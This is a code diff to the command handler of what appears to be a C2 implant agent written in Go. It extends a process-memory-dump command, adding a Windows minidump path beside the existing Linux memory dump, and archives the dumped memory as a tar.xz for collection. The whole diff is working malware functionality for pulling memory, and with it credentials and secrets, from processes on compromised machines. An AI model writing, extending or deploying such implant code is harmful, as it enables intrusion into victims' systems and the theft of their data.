@@ -388,7 +388,7 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 		pid := flags.IntP("pid", "p", 0, "PID of target process")
 		flags.Parse(cmdSlice[1:])
 		if *pid == 0 {
-			out = fmt.Sprintf("Error: args error: %v", cmdSlice)
+			out = fmt.Sprintf("Error: invalid PID: %v", cmdSlice)
 			return
 		}
 		outpath := fmt.Sprintf("%s/%d", RuntimeConfig.AgentRoot, *pid)
@@ -397,24 +397,33 @@ func C2CommandsHandler(cmdSlice []string) (out string) {
 			out = fmt.Sprintf("Error: %v", err)
 			return
 		}
-		dumped_data, err := util.DumpProcMem(*pid)
-		if err != nil {
-			out = fmt.Sprintf("Error: %v", err)
-			return
-		}
-		for base, data := range dumped_data {
-			filePath := fmt.Sprintf("%s/%d_%d.bin", outpath, *pid, base)
-			err = os.WriteFile(filePath, data, 0600)
+		tarball := fmt.Sprintf("%d.tar.xz", *pid)
+		switch runtime.GOOS {
+		case "windows":
+			tarball = strings.ReplaceAll(tarball, "\\", "/")
+			filePath := fmt.Sprintf("%s/%d.bin", outpath, *pid)
+			err = util.MiniDumpProcess(*pid, filePath)
+			if err != nil {
+				out = fmt.Sprintf("Error (minidump): %v", err)
+				return
+			}
+		case "linux":
+			dumped_data, err := util.DumpProcMem(*pid)
 			if err != nil {
 				out = fmt.Sprintf("Error: %v", err)
 				return
 			}
+			for base, data := range dumped_data {
+				filePath := fmt.Sprintf("%s/%d_%d.bin", outpath, *pid, base)
+				err = os.WriteFile(filePath, data, 0600)
+				if err != nil {
+					out = fmt.Sprintf("Error: %v", err)
+					return
+				}
+			}
 		}
-		tarball := fmt.Sprintf("%s/%d.tar.xz", RuntimeConfig.AgentRoot, *pid)
-		if runtime.GOOS == "windows" {
-			tarball = strings.ReplaceAll(tarball, "\\", "/")
-		}
-		err = util.TarXZ(outpath, tarball)
+		os.Chdir(RuntimeConfig.AgentRoot)
+		err = util.TarXZ(fmt.Sprintf("%d", *pid), tarball)
 		if err != nil {
 			out = fmt.Sprintf("Error: %v", err)
 			return
